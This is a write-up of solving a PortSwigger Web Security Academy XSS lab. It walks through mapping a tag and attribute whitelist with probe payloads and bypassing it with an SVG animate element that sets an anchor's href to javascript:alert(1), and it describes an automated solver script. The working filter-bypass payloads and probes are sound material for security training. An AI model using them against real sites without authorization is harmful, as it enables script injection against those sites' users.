# REPORT — Reflected XSS with event handlers and href attributes blocked

**Lab:** PortSwigger Web Security Academy, Cross-site scripting → Contexts
**Difficulty:** EXPERT (badge rendered client-side on the Academy page)
**Instance:** `https://<LAB-ID>.web-security-academy.net`
**Result:** solved — baseline `is-notsolved` → exploit response already
`is-solved`; the flip happened on the crafted search request itself.

## 1. Surface

A blog with a single input, the search box:

```html
<form action=/ method=GET>
  <input type=text placeholder='Search the blog...' name=search>
  <button type=submit class=button>Search</button>
</form>
```

Search results render the raw term in the heading:

```html
<h1>0 search results for 'zzqq123'</h1>
```

No escaping, no encoding, no CSP. Only the input filter stands between the
query string and the DOM.

## 2. The filter is a whitelist, and it says so

Rejected terms never reach the page: the server answers HTTP 400 with a
20-byte plain-text reason.

| Probe | HTTP | Body |
|---|:--:|---|
| `<b>x</b>` | 400 | `"Tag is not allowed"` |
| `<script>alert(1)</script>` | 400 | `"Tag is not allowed"` |
| `<img src=x onerror=alert(1)>` | 400 | `"Event is not allowed"` |
| `<svg onload=alert(1)>` | 400 | `"Event is not allowed"` |
| `<svg><animate attributeName=onbegin values=alert(1)>` | 400 | `"Event is not allowed"` |
| `<a href=javascript:alert(1)>x</a>` | 400 | `"Attribute is not allowed"` |

Note the last two: even an `attributeName=onbegin` *value* trips the event
check, and a bare `href=` attribute is rejected no matter what it points at.
The filter is looking at attribute names in the raw request.

## 3. Mapping the whitelist

Probing tag by tag showed the SVG animation surface survives:

| Probe | HTTP |
|---|:--:|
| `<svg>` | 200 |
| `<a>` | 200 |
| `<animate>` | 200 |
| `<text>` | 200 |

That combination is exactly what is needed: an anchor whose destination is
supplied by an animation instead of by an attribute the filter can see.

## 4. Exploit

```
/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

Rendered:

```html
<h1>0 search results for '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>'</h1>
```

`<animate attributeName=href values=javascript:alert(1)>` starts its animation
immediately, so the `<a>` acquires `href="javascript:alert(1)"` in the live DOM
— after the filter has finished. The `<text>` node is the rendered link body.

The lab description is explicit that the simulated user clicks vectors labelled
with the word **Click**, which `Click me` satisfies; without that label the
payload would reflect but never be clicked.

## 5. Verification

Server-side (authoritative): the response to the exploit request already
contained `<section class='academyLabBanner is-solved'>`, the
`notification-labsolved` block ("Congratulations, you solved the lab!") and
`widgetcontainer-lab-status is-solved` / `<p>Solved</p>`. The previous home page
fetch had been `is-notsolved`, so the transition is attributable to this request
(`caused by solver: yes`).

Browser-side: in Chrome the reflected DOM is

* `h1 svg a animate` with `attributeName=href`, `values=javascript:alert(1)`;
* a trusted CDP mouse click at the centre of the `<text>` node (436.9, 308.7)
  fired `window.alert("1")`.

## 6. Solver design

`solve.py` treats the filter as a contract and tests it every run:

1. read the lab title, the search parameter name and the solved baseline;
2. assert the three blocks named in the lab title still answer 400 with their
   reason strings (event handler, `href`, non-whitelisted tag);
3. assert `svg`, `a`, `animate`, `text` are still allowed;
4. send the vector and assert the reflection contains the raw
   `<animate attributeName=href values=javascript:alert(1) />` **and** the
   `Click me` label;
5. poll `GET /` for the solved widget.

If PortSwigger tightens the filter (e.g. blocks `animate`), step 3 fails with a
named tag instead of the solver silently sending a dead payload. Nothing about
the host, parameter, baseline or filter strings is hardcoded.

## 7. Cost and timing

| Run | Requests | Wall clock |
|---|:--:|---|
| Lab folder, `--wait 15 --verbose` | 10 | 3.7 s |
| Root launcher (title fetch + solver) | 1 + 10 | 4.0 s |

No exploit server exists on this lab (`GET /exploit` → 404) and no victim
delivery step is needed; the checker is server-side.

## 8. Notes

* `GET /` is the only page needed — this lab has no per-post parameter.
* The 400 bodies are JSON-quoted plain text (`"Tag is not allowed"`), including
  the quotes; matching on the inner text is enough.
* The "Click" requirement is a lab mechanic, not a browser one: the alert fires
  on click either way, but only a vector labelled `Click…` gets clicked by the
  simulated user.
